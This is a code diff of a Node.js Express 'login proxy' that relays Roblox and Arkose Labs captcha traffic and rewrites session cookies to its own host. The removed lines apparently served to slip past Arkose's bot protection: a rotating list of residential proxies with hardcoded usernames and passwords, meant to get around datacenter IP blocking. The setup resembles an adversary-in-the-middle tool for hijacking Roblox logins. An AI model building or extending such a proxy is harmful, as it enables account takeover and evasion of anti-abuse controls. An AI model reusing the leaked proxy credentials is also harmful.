@@ -2,74 +2,12 @@ const express = require('express');
 const { createProxyMiddleware, responseInterceptor } = require('http-proxy-middleware');
 const https = require('https');
 const http = require('http');
-const { HttpsProxyAgent } = require('https-proxy-agent');
-const { HttpProxyAgent } = require('http-proxy-agent');
 
 const app = express();
 
 console.log('='.repeat(60));
-console.log('🔒 PURE LOGIN PROXY - WITH RESIDENTIAL PROXY SUPPORT');
+console.log('🔒 PURE LOGIN PROXY - WITH FULL ARKOSE SUPPORT');
 console.log('='.repeat(60));
-
-// Residential proxies for Arkose Labs (to bypass datacenter IP blocking)
-const RESIDENTIAL_PROXIES = [
-    'http://104574_FmGRR_s_1KB03APR4ILFSCMW:HoxFFU3jQA@residential.pingproxies.com:8872',
-    'http://104574_FmGRR_s_BAY283TIWZ05HV2A:HoxFFU3jQA@residential.pingproxies.com:8392',
-    'http://104574_FmGRR_s_Y3QTLQRA0S49RUWK:HoxFFU3jQA@residential.pingproxies.com:8269',
-    'http://104574_FmGRR_s_L8K0M14X3H8KAIOL:HoxFFU3jQA@residential.pingproxies.com:8221',
-    'http://104574_FmGRR_s_Q4FLL3QJZ46JQ2YF:HoxFFU3jQA@residential.pingproxies.com:8977',
-];
-
-let proxyIndex = 0;
-
-// Test residential proxy connectivity on startup
-async function testResidentialProxy() {
-    const testProxy = RESIDENTIAL_PROXIES[0];
-    console.log('Testing residential proxy connectivity...');
-
-    try {
-        const agent = new HttpsProxyAgent(testProxy, {
-            keepAlive: true,
-            timeout: 10000,
-            rejectUnauthorized: true
-        });
-
-        const req = https.get('https://arkoselabs.roblox.com/v2/476068BF-9607-4799-B53D-966BE98E2B81/api.js', {
-            agent,
-            headers: {
-                'User-Agent': BROWSER_UA
-            }
-        }, (res) => {
-            console.log(`✅ Residential proxy test: ${res.statusCode}`);
-            if (res.statusCode === 200) {
-                console.log('✅ Residential proxy is working correctly!');
-            } else {
-                console.log(`⚠️ Residential proxy returned status ${res.statusCode}`);
-            }
-            // IMPORTANT: Consume the response body to close the connection
-            res.resume();
-        });
-
-        req.on('error', (err) => {
-            console.error('❌ Residential proxy test failed:', err.message);
-        });
-
-        // Set timeout using setTimeout instead of event
-        req.setTimeout(10000, () => {
-            console.error('❌ Residential proxy test timed out');
-            req.destroy();
-        });
-
-    } catch (err) {
-        console.error('❌ Failed to initialize residential proxy test:', err.message);
-    }
-}
-
-function getNextResidentialProxy() {
-    const proxy = RESIDENTIAL_PROXIES[proxyIndex];
-    proxyIndex = (proxyIndex + 1) % RESIDENTIAL_PROXIES.length;
-    return proxy;
-}
 
 // Shared HTTPS agent with keep-alive for connection pooling
 const httpsAgent = new https.Agent({
@@ -1250,13 +1188,8 @@ app.options('*', (req, res) => {
 });
 
 function createRobloxProxy(prefix, target) {
+    const agent = target.startsWith('https:') ? httpsAgent : httpAgent;
     const isArkose = target.includes('arkoselabs.com') || target.includes('funcaptcha.com') || target.includes('rbxcdn.com');
-    
-    // Use residential proxy for Arkose Labs to bypass IP blocking
-    let agent = target.startsWith('https:') ? httpsAgent : httpAgent;
-    if (isArkose) {
-        console.log(`[${prefix}] Will use residential proxy for requests`);
-    }
     
     return createProxyMiddleware({
         target,
@@ -1266,16 +1199,9 @@ function createRobloxProxy(prefix, target) {
         proxyTimeout: 30000,
         timeout: 30000,
         agent,
-        // Use upstream proxy for Arkose requests
-        proxy: isArkose ? getNextResidentialProxy() : undefined,
         
         on: {
             proxyReq: (proxyReq, req) => {
-                // Debug logging for Arkose requests
-                if (isArkose) {
-                    console.log(`[${prefix}] → ${req.method} ${target}${req.path}`);
-                }
-
                 // For Arkose/rbxcdn, use their own origin/referer
                 if (isArkose) {
                     const arkoseOrigin = target.replace(/\/+$/, '');
@@ -1303,11 +1229,6 @@ function createRobloxProxy(prefix, target) {
             },
 
             proxyRes: (proxyRes, req) => {
-                // Log Arkose Labs responses for debugging
-                if (isArkose) {
-                    console.log(`[${prefix}] ${req.method} ${req.path} → ${proxyRes.statusCode} (via residential proxy)`);
-                }
-                
                 if (proxyRes.headers['set-cookie']) {
                     const host = req.headers.host || 'localhost';
                     proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], host);
@@ -1336,18 +1257,8 @@ function createRobloxProxy(prefix, target) {
                     return;
                 }
                 console.error(`[${prefix}] ❌ ${req.method} ${req.path} | ${err.code}: ${err.message}`);
-
-                // If residential proxy fails, log additional details
-                if (isArkose) {
-                    console.error(`[${prefix}] Residential proxy error details:`, {
-                        proxyHost: 'residential.pingproxies.com',
-                        error: err.message,
-                        code: err.code
-                    });
-                }
-
                 if (!res.headersSent) {
-                    res.status(502).json({ error: 'Proxy error', code: err.code, message: err.message });
+                    res.status(502).json({ error: 'Proxy error', code: err.code });
                 }
             }
         }
@@ -1422,9 +1333,6 @@ app.use('/', createProxyMiddleware({
 const PORT = process.env.PORT || 8080;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Proxy running on port ${PORT}`);
-
-    // Test residential proxy after server starts
-    setTimeout(testResidentialProxy, 1000);
     console.log(`📋 rbxcdn.com domains mapped:`);
     console.log(`   - apis.rbxcdn.com → /apis-rbxcdn`);
     console.log(`   - captcha.rbxcdn.com → /captcha-rbxcdn`);
